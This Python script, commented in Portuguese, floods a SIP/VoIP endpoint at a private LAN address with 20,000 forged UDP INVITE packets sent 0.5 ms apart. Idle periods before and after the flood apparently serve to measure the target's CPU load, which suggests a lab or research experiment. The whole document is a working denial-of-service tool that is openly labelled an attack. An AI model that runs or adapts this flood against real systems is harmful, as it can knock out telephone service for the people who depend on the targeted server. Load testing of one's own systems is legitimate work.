import socket
import time
import os

# Configurações do ataque
IP_DESTINO = '192.168.0.75'
PORTA_DESTINO = 5060
PACOTES = 20000
INTERVALO_ENVIO = 0.0005  # 0.5ms entre pacotes (não sobrecarrega rede local mas gera carga)

# Função para realizar o ataque
def realizar_ataque():
    print(f"🚀 Iniciando ataque SIP Flood para {IP_DESTINO}:{PORTA_DESTINO}...\n")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    mensagem_sip = f"""INVITE sip:ataque@{IP_DESTINO} SIP/2.0
Via: SIP/2.0/UDP 192.168.0.100:{PORTA_DESTINO};branch=z9hG4bK-attack
From: <sip:ataque@{IP_DESTINO}>;tag=12345
To: <sip:ataque@{IP_DESTINO}>
Call-ID: ataque-{{}}@192.168.0.100
CSeq: 1 INVITE
Contact: <sip:ataque@192.168.0.100>
Max-Forwards: 70
User-Agent: SIPFloodTool
Content-Length: 0

"""
    for i in range(1, PACOTES + 1):
        pacote = mensagem_sip.format(i)
        sock.sendto(pacote.encode(), (IP_DESTINO, PORTA_DESTINO))
        if i % 1000 == 0:
            print(f"📤 {i} pacotes enviados...")
        time.sleep(INTERVALO_ENVIO)

# Execução principal
if __name__ == "__main__":
    print("🔵 Preparando ambiente para ataque...\n")
    print("⏳ Aguardando 10 segundos coletando CPU em repouso...")
    time.sleep(10)

    realizar_ataque()

    print("\n⏳ Aguardando 10 segundos após o ataque para coleta de CPU...")
    time.sleep(10)

    print("\n✅ Ataque e coleta concluídos! Agora você pode copiar o arquivo de log e gerar os gráficos.")
